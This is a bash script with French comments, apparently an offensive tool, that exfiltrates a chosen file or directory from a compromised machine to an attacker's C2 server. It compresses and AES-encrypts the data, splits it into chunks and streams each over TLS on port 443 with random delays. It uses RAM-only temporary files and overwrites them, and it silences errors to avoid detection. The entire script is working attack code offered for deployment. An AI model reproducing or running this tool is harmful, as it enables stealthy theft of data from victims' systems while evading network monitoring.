#!/usr/bin/env bash
# =============================================================================
# exfil_send.sh — Exfiltration chiffrée par blocs via TLS (côté cible)
# Usage : bash exfil_send.sh <chemin_cible> <C2_host> [port]
#
# Pipeline :
#   tar czf  →  AES-256-CBC + PBKDF2  →  split 64 KiB
#   → openssl s_client (TLS/443) + jitter entre chaque bloc
#   → sentinel CIPHERFALL_DONE:<n>:<sha256> pour signaler la fin
#
# Discrétion :
#   - Payload entièrement chiffré avant tout envoi réseau
#   - Port 443 : indiscernable d'HTTPS au niveau réseau
#   - Jitter aléatoire entre blocs : évite les pics de bande passante
#   - Fichiers temporaires en /dev/shm (tmpfs RAM) : aucune écriture disque
#   - Écrasement par urandom avant suppression de chaque chunk
#   - stderr supprimé sur toutes les commandes réseau
#
# Limitation :
#   Le certificat du receiver n'est pas vérifié (self-signed attendu).
#   Acceptable sur un canal attaquant contrôlé.
# =============================================================================

set -euo pipefail

# ── Configuration (adapter avant déploiement) ─────────────────────────────────
readonly C2_HOST="${2:?Usage: $0 <chemin> <C2_host> [port]}"
readonly C2_PORT="${3:-443}"
readonly AES_KEY="CHANGE_ME_32CHAR_SECRET_KEY_HERE"
readonly CHUNK_BYTES=65536
readonly JITTER_MIN=2
readonly JITTER_MAX=8
readonly TMP_DIR="/dev/shm"
readonly SENTINEL_PREFIX="CIPHERFALL_DONE"

# ── Helpers ───────────────────────────────────────────────────────────────────
_has()  { command -v "$1" &>/dev/null; }
_err()  { printf '[!] %s\n' "$*" >&2; exit 1; }
_info() { printf '[*] %s\n' "$*" >&2; }

_jitter() {
    awk -v mn="$JITTER_MIN" -v mx="$JITTER_MAX" -v seed="$RANDOM" 'BEGIN {
        srand(seed); printf "%.2f\n", mn + rand() * (mx - mn)
    }'
}

_wipe() {
    [[ -f "$1" ]] || return 0
    local sz
    sz=$(wc -c < "$1")
    [[ $sz -gt 0 ]] && dd if=/dev/urandom of="$1" bs="$sz" count=1 conv=notrunc 2>/dev/null || true
    rm -f "$1"
}

_send_tls() {
    openssl s_client \
        -connect "${C2_HOST}:${C2_PORT}" \
        -quiet \
        -verify_quiet \
        2>/dev/null
}

# ── Validation ────────────────────────────────────────────────────────────────
TARGET="${1:?Usage: $0 <chemin> <C2_host> [port]}"
[[ -e "$TARGET" ]] || _err "Chemin introuvable : $TARGET"
_has openssl  || _err "openssl requis"
_has tar      || _err "tar requis"
_has split    || _err "split (coreutils) requis"
_has sha256sum || _err "sha256sum requis"
_has awk      || _err "awk requis"

# ── Étape 1 : compression + chiffrement dans tmpfs ───────────────────────────
ENCRYPTED=$(mktemp "${TMP_DIR}/.cf_XXXXXX")

cleanup() {
    _wipe "$ENCRYPTED" 2>/dev/null || true
    find "$TMP_DIR" -maxdepth 1 -name ".cf_chunk_*" -delete 2>/dev/null || true
}
trap cleanup EXIT

_info "Archivage + chiffrement : $TARGET"
tar czf - "$TARGET" 2>/dev/null \
    | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -k "$AES_KEY" \
    > "$ENCRYPTED"

TOTAL_SIZE=$(wc -c < "$ENCRYPTED")
[[ $TOTAL_SIZE -eq 0 ]] && _err "Payload vide après chiffrement"

TOTAL_CHUNKS=$(( (TOTAL_SIZE + CHUNK_BYTES - 1) / CHUNK_BYTES ))
CHECKSUM=$(sha256sum "$ENCRYPTED" | awk '{print $1}')

_info "Payload : ${TOTAL_SIZE} o → ${TOTAL_CHUNKS} blocs de ${CHUNK_BYTES} o"
_info "SHA-256  : ${CHECKSUM}"

# ── Étape 2 : découpage ───────────────────────────────────────────────────────
split \
    -b "$CHUNK_BYTES" \
    --numeric-suffixes=1 \
    --suffix-length=6 \
    "$ENCRYPTED" \
    "${TMP_DIR}/.cf_chunk_"

_wipe "$ENCRYPTED"

# ── Étape 3 : envoi des blocs avec jitter ────────────────────────────────────
sent=0
while IFS= read -r chunk; do
    sent=$(( sent + 1 ))
    chunk_sz=$(wc -c < "$chunk")
    _info "Bloc ${sent}/${TOTAL_CHUNKS} (${chunk_sz} o)..."

    _send_tls < "$chunk" || _err "Échec envoi bloc ${sent}"
    _wipe "$chunk"

    if [[ $sent -lt $TOTAL_CHUNKS ]]; then
        delay=$(_jitter)
        _info "Pause ${delay}s"
        sleep "$delay"
    fi
done < <(find "$TMP_DIR" -maxdepth 1 -name ".cf_chunk_*" 2>/dev/null | sort)

# ── Étape 4 : sentinel de fin ─────────────────────────────────────────────────
_info "Envoi du sentinel..."
printf '%s:%d:%s\n' "$SENTINEL_PREFIX" "$TOTAL_CHUNKS" "$CHECKSUM" \
    | _send_tls \
    || _err "Échec envoi sentinel"

_info "Exfiltration terminée : ${TOTAL_CHUNKS} blocs envoyés vers ${C2_HOST}:${C2_PORT}"
